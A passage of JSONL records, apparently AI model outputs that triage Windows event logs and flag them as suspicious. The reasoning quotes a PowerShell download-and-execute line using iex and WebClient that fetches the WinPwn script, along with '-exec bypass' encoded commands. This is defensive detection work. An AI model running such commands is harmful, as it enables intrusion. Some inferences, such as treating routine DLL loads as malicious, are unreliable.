Let me break it down.\n\nFirst, there are multiple events where cmd.exe is spawning powershell with some encoded command-line arguments. That's already a red flag because using powershell with the -exec bypass option is often used by attackers to execute malicious scripts without going through normal execution paths.\n\nThen, I see several ImageLoad events from powershell.exe loading various DLLs like clr.dll and mscorlib.ni.dll. While these are legitimate .NET framework components, the fact that they're being loaded in this context might indicate an attempt to load malicious code or execute arbitrary scripts.\n\nThere's a FileCreate event where a temporary PowerShell script is created: __PSScriptPolicyTest_rtdkaqiv.g0h.ps1 and another one with 0wo2rwkr.dxh.ps1. Creating temp files, especially with .ps1 extensions, could be part of dropping malicious scripts onto the system.\n\nLooking at the command line in one event, there's a call to download something from GitHub using a WebClient object. The URL points to raw.githubusercontent.com\/S3cur3Th1sSh1t\/WinPwn\/... which is known for hosting malicious scripts like WinPwn. This is definitely concerning because it indicates an attempt to fetch and execute external code, which could be part of a larger attack.\n\nThere's also a whoami.exe process being created. While this could just be a legitimate user checking their permissions, in the context of other suspicious activities, it might be part of lateral movement or privilege escalation.\n\nAdditionally, there are registry value sets by wmiprvse.exe and powershell.exe. These can be used for persistence mechanisms or to hide malicious activities.\n\nPutting all these together: multiple instances of powershell.exe being spawned with encoded commands, creation of temp scripts, downloading from a suspicious repository, and interaction with the registry. These collectively suggest that an attacker is attempting to execute malicious code on the system, possibly leading to unauthorized access or data exfiltration.\n<\/think>\n\n```json\n{\n  \"CLASSIFICATION\": \"INTERESTING\",\n  \"JUSTIFICATION\": \"Multiple instances of suspicious PowerShell activities including encoded command execution, file creation in temporary directories, and downloading scripts from a known malicious repository indicate potential malicious behavior.\",\n  \"CONFIDENCE\": 0.95\n}\n```"}
{"file":"filtering\/llama3.2_3b\/attack\/20250606_143748.jsonl","analysis":"<think>\nAlright, I'm looking at this batch of JSONL events to determine if they're interesting for investigation. Let me go through each event step by step.\n\nThe first event shows PowerShell deleting a file: `C:\\Users\\fiddelis\\AppData\\Local\\Temp\\__PSScriptPolicyTest_0wo2rwkr.dxh.ps1`. This is concerning because scripts dropped in temporary directories can be malicious, especially if they're being deleted to avoid detection. The fact that it's a PowerShell script adds another layer since attackers often use it for its execution capabilities.\n\nNext, there are several events where the command line has `powershell -exec bypass` with an encoded string starting with `SQBuAHY...`. The `-exec bypass` flag is a red flag because it allows scripts to run without certain security checks. Also, base64-encoded commands can indicate attempts to hide malicious activities.\n\nLooking further down, I see multiple events where the command line starts with `powershell.exe & {iex(new-object net.webclient).downloadstring('https:\/\/...')}`. This is clearly downloading code from a remote GitHub repository and executing it using `iex`, which stands for Invoke-Expression in PowerShell. The URL points to a script named `WinPwn.ps1` from a known repository associated with malicious activities, as indicated by the username `S3cur3Th1sSh1t`. This is a strong indicator of potentially harmful code being executed on the system.\n\nAdditionally, there are events where the task in `winlog` is related to downloading and executing scripts. These include tasks like 'Image loaded', 'Provider Lifecycle', and 'Engine Lifecycle'. These logs suggest that PowerShell components are being dynamically loaded or initialized, which could be part of a larger attack chain.\n\nMoreover, towards the end of the events, there are several entries where `winlog` shows tasks related to remote command execution. This implies that commands were executed over the network, possibly indicating remote control or unauthorized access attempts.\n\nTaking all these events together, it's clear that this batch involves multiple instances of PowerShell being used in a way that's commonly associated with cyberattacks. The combination of script deletion, use of `-exec bypass`, downloading and executing scripts from known malicious sources, and repeated attempts to execute remote commands strongly suggests a potential security incident.\n\nThe confidence level is high because the activities described align closely with indicators of compromise (IoCs) for malware or APTs using PowerShell for command execution and persistence. The repetitive nature of these events across different log entries also supports the conclusion that this isn't just a one-off incident but part of a coordinated attack.\n<\/think>\n\n```json\n{\n  \"CLASSIFICATION\": \"INTERESTING\",\n  \"JUSTIFICATION\": \"Multiple events show suspicious PowerShell activity, including script execution and downloading code from a known malicious repository.\",\n  \"CONFIDENCE\": 0.95\n}\n```"}
